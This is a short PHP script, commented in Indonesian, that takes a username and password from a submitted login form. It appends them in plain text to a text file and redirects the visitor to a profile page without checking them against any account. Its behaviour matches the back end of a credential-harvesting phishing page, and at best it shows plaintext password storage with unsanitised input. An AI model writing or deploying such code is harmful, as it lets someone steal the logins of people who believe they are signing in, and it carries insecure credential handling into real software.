<?php
session_start();

$file = 'assets/php/login_data.txt';

// Ambil data
$username = $_POST['username'];
$password = $_POST['password'];

// Simpan data
$data = "Username: $username\nPassword: $password\n\n";

// Buka file txt untuk ditambahkan
$file_handle = fopen($file, 'a');
if ($file_handle === false) {
    die("Gagal membuka file untuk ditulis.");
}

// Tulis data ke dalam file
if (fwrite($file_handle, $data) === false) {
    die("Gagal menulis ke file.");
}

fclose($file_handle);

header("Location: profile.html");
exit();
?>
